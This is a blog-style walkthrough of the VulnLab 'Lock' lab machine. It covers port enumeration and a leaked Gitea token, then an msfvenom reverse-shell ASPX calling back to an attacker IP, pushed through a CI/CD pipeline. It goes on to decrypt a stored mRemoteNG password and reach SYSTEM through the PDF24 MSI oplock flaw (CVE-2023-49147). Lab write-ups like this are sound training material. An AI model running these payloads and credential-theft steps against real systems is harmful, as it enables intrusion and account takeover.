---
title: Lock
date: 2026-01-22 10:40:23
categories: ["VulnLab"]
tags: ["Gitea", "Information Disclosure", "Insecure CI/CD Configuration"]
cover: https://assets.vulnlab.com/lock_slide.png
---

# TLDR 
You will learn about the Git API, CI/CD Deployments & a PrivEsc technique on a MSI installer.

# Enumeration
```bash
(jon@kali)-[~/vulnLab/easy/lock/website]$ sudo nmap -p- --min-rate=1000 -T4 lock.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 10:43 +08
Nmap scan report for lock.vl (10.10.102.59)
Host is up (0.20s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 2018.88 seconds
```
- Several Windows services are running on this host.

## HTTP (80)
### Dirsearch
```bash
(jon@kali)-[~/vulnLab/easy/lock/website]$ dirsearch -u http://lock.vl:80
...
[13:46:13] 301 - 159B - /.git/logs/refs/heads → http://lock.vl/.git/logs/refs/heads/
[13:46:13] 301 - 168B - /.git/logs/refs/remotes/origin → http://lock.vl/.git/logs/refs/remotes/origin/
[13:46:13] 301 - 153B - /.git/refs/heads → http://lock.vl/.git/refs/heads/
[13:46:13] 403 - 1KB - /.git/objects/
[13:46:13] 301 - 161B - /.git/logs/ → http://lock.vl/.git/logs/
[13:46:13] 301 - 168B - /.git/logs/refs/remotes → http://lock.vl/.git/logs/refs/remotes/
[13:46:13] 403 - 1KB - /.git/refs/
[13:46:13] 301 - 156B - /.git/refs/remotes → http://lock.vl/.git/refs/remotes/
[13:46:13] 301 - 163B - /.git/refs/remotes/origin → http://lock.vl/.git/refs/remotes/origin/
[13:46:13] 301 - 153B - /.git/refs/tags → http://lock.vl/.git/refs/tags/
[13:46:47] 403 - 312B - /../../../../../../etc/passwd
[13:47:05] 404 - 2KB - /admin%20/
[13:47:08] 404 - 2KB - /admin..
[13:48:01] 403 - 1KB - /assets/
[13:48:02] 301 - 145B - /assets → http://lock.vl/assets/
[13:48:03] 403 - 1KB - /aspnet_client/
[13:48:03] 301 - 152B - /aspnet_client → http://lock.vl/aspnet_client/
[13:48:23] 403 - 312B - /cgi-bin/../../../../../../etc/passwd
[13:48:24] 200 - 46B - /changelog.txt
[13:48:24] 200 - 46B - /ChangeLog.txt
[13:48:25] 200 - 46B - /CHANGELOG.TXT
[13:48:25] 200 - 46B - /Changelog.txt
```

### Website Features
![Port 80 Website](\images\Lock\port80_website.png)
- The website is a document convertor and management site. I found nothing interesting.

## SMB (445)
```bash
(jon㉿kali)-[~/vulnLab/vpn]$ smbclient -L //10.10.102.59/
Password for [WORKGROUP\jon]:
session setup failed: NT_STATUS_ACCESS_DENIED

(jon㉿kali)-[~/vulnLab/vpn]$ nmap -p445 --script smb-enum-shares,smb-enum-users lock.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 13:39 +08
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for lock.vl (10.10.102.59)
Host is up (0.17s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```
- SMB Username and password authenetication is enabled. I failed to enumerate any usernames and shares.

## PPP (3000)
```bash
(jon㉿kali)-[~/vulnLab/vpn]$ curl -v http://lock.vl:3000


```
- I got some HTML content when I curled port 3000.

![Gitea Home Page](\images\Lock\gitea.png)
- Looking up this URL on the browser, I noticed Gitea is running on port 3000. Interesting.

### Dirsearch
```bash
(jon㉿kali)-[~/vulnLab/vpn]$ curl -v http://lock.vl:3000


```
- Using dirsearch again, I found interesting directories on Gitea.

### Website Features
![Admin Gitea](\images\Lock\admin.png)
- There's an administrator user in the `http"//lock.vl:3000/administrator` directory.

![Ellen Gitea](\images\Lock\ellen.png)
```bash
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```
- There's also an **ellen** user with a **dev-scripts** repository containing a `repos.py` script.
- This script takes a domain as an argument and passes it to the `format_domain()` function to check if HTTP or HTTPS is used. It looks for an environment variable called `GITEA_ACCESS_TOKEN` for Gitea authentication to access the repos on the site with the `get_repositories()` function. If the environment variable isn’t set, it means the user isn’t authenticated and the script exits. The script eventually prints out all existing repositories with their associated owner usernames.

## RDP (3389)
```bash
(jon@kali)-[~/vulnLab/easy/lock]$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p3389 -T4 lock.vl

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-10 08:13 UTC
Nmap scan report for lock.vl (10.10.78.243)
Host is up (0.18s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|   System_Time: 2026-01-10T08:13:18+00:00
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Protocol Version: Unknown

Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds
```
- Using nmap scripts, I checked for RDP encryption, DOS vulnerability and NTLM info. The output shows Network Level Authentication (NLA) is enabled and a password is needed for RDP authentication.

## HTTP API (5357)
```bash
(jon@kali)-[~/vulnLab/easy/lock]$ nmap -p5357 -A lock.vl

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 16:24 +08
Nmap scan report for lock.vl (10.10.78.243)
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
5357/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2022|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 5357/tcp)
HOP RTT      ADDRESS
1   194.71 ms 10.8.0.1
2   183.13 ms lock.vl (10.10.78.243)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.58 seconds
```
- Port 5357 is open and running a Microsoft HTTP API service. 
- The endpoint is up and alive, but not public-facing, as indicated by the "Service Unavaiable" server header response.

## WinRM (5985)
```bash
(jon@kali)-[~/vulnLab/easy/lock]$ curl -v http://lock.vl:5985/wsman
* Host lock.vl:5985 was resolved.
* IPv6: (none)
* IPv4: 10.10.123.156:5985 ...
*   Trying 10.10.123.156:5985...
* Connected to lock.vl (10.10.123.156) port 5985 (#0)
> GET /wsman HTTP/1.1
> Host: lock.vl:5985
> User-Agent: curl/8.17.0
> Accept: */*
> 
< HTTP/1.1 405 
< Allow: POST
< Server: Microsoft-HTTPAPI/2.0
< Date: Sun, 11 Jan 2026 01:16:58 GMT
< Connection: close
< Content-Length: 0
< 
* Closing connection 0
```
- Using `curl` on the `/wsman` endpoint, it returned a POST request. Meaning the service is up and alive.

# Gaining a Foothold
## Enumerating Gitea repos
```bash
import requests
import sys

# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = <REDACTED>

import os
```
- Searching **ellen's** repository, I found her personal access token in the initial commit called "Update repos.py".

```bash
(jon㉿kali)-[~/vulnLab/easy/lock]$ python3 repos.py http://lock.vl:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```
- Using her personal access token with `repos.py`, I found she has another repo called **website**.

![Website repo on browser](\images\Lock\404.png)
- The Gitea website returns a 404 Not Found error status when I redirected to the `/website` repository.

```bash
jon@kali:~$ git clone http://ellen.freeman:<REDACTED>@lock.vl:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 165 (delta 35), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 362.00 KiB/s, done.
Resolving deltas: 100% (35/35), done.
```
- Researching how to structure the repo URL with only the username, personal access token and repo name, I cloned the **website** repo on Kali Linux. This **website** repo is likely private since it still exists. Thus, we can’t see it on the browser as an outsider.

```bash
(jon㉿kali)-[~/vulnLab/easy/lock/website]$ cat readme.md
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```
- The `readme.md` file says the CI/CD integration is active and **all future commits to the repo will be uploaded to the web server**. This means changes we make as an authenticated user to the **website** repo will be updated on the web server.

## Getting a shell on lock.vl
Given the information from `readme.md`, we can attempt to commit an ASPX shell to the web server via the CI/CD pipeline and get it to connect to our Kali Linux machine.
An ASPX shell is a malicious ASP.NET script uploaded to a Windows server that gives attackers remote access to it via the browser. Hence, gaining persistence on the server.

```bash
(jon㉿kali)-[~/vulnLab/easy/lock/website]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.7.230 LPORT=1337 -f aspx -o reverse_shell.aspx
No platform was selected, choosing Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3419 bytes
Saved as: reverse_shell.aspx
```
- We can create our own `.aspx` file to create a reverse TCP shell for the web server to connect to our attack machine.

```bash
(jon㉿kali)-[~/vulnLab/easy/lock/website]$ git add .
(jon㉿kali)-[~/vulnLab/easy/lock/website]$ git commit -m "upload rever_shell.aspx"
(jon㉿kali)-[~/vulnLab/easy/lock/website]$ git push http://<REDACTED>@lock.vl:3000/ellen.freeman/website.git
```
- Using native `git` CLI commands, I committed and pushed this script to the **website** repository. Remember to configure **ellen’s** username and email with the `--global` option first.

![RCE on lock.vl:3000](images\Lock\rce.png)
- Setting up a netcat listener on Kali Linux, I navigated to my `reverse_shell.aspx` file on the web server (as mentioned in the `readme.md` file) at `http://lock.vl/reverse_shell.aspx` and gained remote access to the Windows server.

# Priv Esc
## Priv Esc to ellen
```powershell
c:\windows\system32\inetsrv>whoami
whoami
lock\ellen.freeman

c:\windows\system32\inetsrv>hostname
hostname
Lock

c:\windows\system32\inetsrv>
```
- We now have remote access to `lock.vl` as **ellen**, who is a low-privileged user.

```powershell
c:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is A03D-9CEF

 Directory of c:\Users

12/28/2023  06:14 AM    <DIR>          .
12/27/2023  02:00 PM    <DIR>          .NET v4.5
12/27/2023  02:00 PM    <DIR>          .NET v4.5 Classic
12/27/2023  12:01 PM    <DIR>          Administrator
12/28/2023  11:36 AM    <DIR>          ellen.freeman
12/28/2023  06:14 AM    <DIR>          gale.dekarios
12/27/2023  10:21 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  5,903,872,000 bytes free

c:\Users>
```
- There's another user called **gale dekarios**.

```powershell
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="10000" FullFileEncryption="false" Protected="SDkrnD0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfO7OH1tVPbhwpy+1fnqfcPQZ3oILRy+DhDFp" ConfVersion="2.6">
  <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3dddc" Username="Gale.Dekarios" Domain="" Password="<REDACTED></REDACTED>"
```
- Since I only had access to **ellen’s** own directory, I explored her file and found a `/documents/config.xml` file. Inside, I found the password for **gale**. It looks encrypted.

## Lateral Movement to gale
Analyzing the contents of `/ellen.freeman/documents/config.xml`, I found it had the `<mrng:Connections></mrng:Connections>` tags with the `Hostname`, `Protocol`, `Username` and `Password` metadata. This means the file is a `mRemoteNG` file.

```bash
(myenv)-(jon@kali)-[~]$ python3 ~/webserver/mRemoteNG_pwd_decrypt.py ~/vulnLab/easy/lock/lock_server_loot/config.xml
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```
- Using the [mRemoteNG_password_decrypt.py](https://github.com/gquere/mRemoteNG_password_decrypt) script from GitHub, I successfully retrieved **gale’s** plaintext password. Refer to the [PycryptoDome documentation](https://pycryptodome-master.readthedocs.io/en/latest/src/installation.html) for installation and troubleshooting steps.

![RDP to lock.vl](\images\Lock\xfreerdp.png)
- I successfully remoted into `lock.vl` as the **gale** user and found the `user.txt` file.

## Priv Esc to SYSTEM via MSI Installer (CVE-2023-49147)
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth        REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process   REG_SZ           "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    AzureArcSetup         REG_EXPAND_SZ    %windir%\AzureArcSetup\Systray\AzureArcSysTray.exe
    PDF24                 REG_SZ           "C:\Program Files\PDF24\pdf24.exe"
```
- I enumerated that **gale** is a low-privileged user too. Querying the registry, I found a PDF24.exe software.

```powershell
C:\Users\gale.dekarios> dir C:\ /A
Directory of C:\

...
12/27/2023  11:28 AM    <DIR>          Users
12/28/2023  11:23 AM    <DIR>          Windows
12/28/2023  11:28 AM    <DIR>          _install

               2 File(s)  1,207,971,840 bytes
              14 Dir(s)   8,408,502,272 bytes free

C:\Users\gale.dekarios> cd C:\_install
C:\_install>dir
 Volume in drive C has no label.
 Volume Serial Number is A03D-9CEF

 Directory of C:\install

12/28/2023  11:21 AM        60,804,608 Firefox Setup 121.0.msi
12/28/2023  05:39 AM        43,593,728 mRemoteNG-Installer-1.76.20.24615.msi
12/14/2023  10:07 AM       462,602,240 pdf24-creator-11.15.1-x64.msi
               3 File(s)    567,000,576 bytes
               0 Dir(s)  8,408,469,504 bytes free

C:\_install>
```
- There's a hidden `_install` directory in the root directory which contains the `pdf24-creator-11.5.1-x64.msi` file. According to a [blog by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/), this MSI installer has a vulnerability that allows an attacker with GUI access to a machine, where the `.msi` file is installed on, to escalate privileges to SYSTEM. The `pdf24-creator-11.5.1-x64.msi` file was found to produce a visible `cmd.exe` window running as SYSTEM when using the repair function of the built-in `msiexec.exe`. This allows an attacker to use a chain of actions, to open a fully functional CMD shell as SYSTEM.
- I'll be following the PoC steps from the blog.

```bash
C:\_install> msiexec /i C:\_install\pdf24-creator-11.15.1-x64.msi
```
- For the exploit to work, the PDF24-creator executable must be installed on the machine already. If not already installed, run this command.
- Based on the blog. At the very end of the repair process, the sub-process `pdf24-PrinterInstall.exe` gets called with SYSTEM privileges and performs a write action on the `"C:\Program Files\PDF24\faxPrnInst.log"` file. This file can be used by an attacker by setting an oplock on it as soon as it gets read. To setup this oplock, we can download [SetOpLock.exe from its Releases Page on GitHub](https://github.com/googleprojectzero/symboliclink-testing-tools) and transfer it to the remote Windows session.

![Running SetOpsLock.exe](\images\Lock\setOpsLock.png)
- Set the lock on the `"C:\Program Files\PDF24\faxPrnInst.log"` file once `SetUpLock.exe` is transferred. You can just copy paste the file since we have remote access to the Windows GUI.

![Patch PDF24.exe](\images\Lock\patch_PDF24.png)
```powershell
msiexec /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```
- Now patch the PDF24-creator MSI installer, follow through with the prompt wizard and a new shell for `pdf24-PrinterInstall.exe` opens.

![Download cmd.exe](\images\Lock\download_cmd.png)
- Right-click on the new shell, select Properties and click on the "Legacy Console Mode" link. Open this link with a browser other than Microsoft Edge and Internet Explorer.
- In the browser, type Ctrl + O, type cmd.exe and save the file. Open the downloaded cmd.exe.

```powershell
C:\Users\Default\Downloads>wghoami
nt authority\system
```
- We now have SYSTEM privileges on `lock.vl` and can find `root.txt` in the Administrator's Desktop.

# References
[seriotonctf VL-Lock blog](https://seriotonctf.github.io/Lock-Vulnlab/)
[purplestormctf VL-Lock blog](https://github.com/purplestormctf/Writeups/blob/main/vulnlab/machines/Lock/Lock.md#port-scanning)
[panosoikogr.github.io VL-Lock blog](https://panosoikogr.github.io/2025/03/10/VL-Lock/#PDF24-CVE-2023-49147)
[PyCryptoDome Documentation](https://pycryptodome-master.readthedocs.io/en/latest/src/installation.html)
[CVE-2023-49147 PoC](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

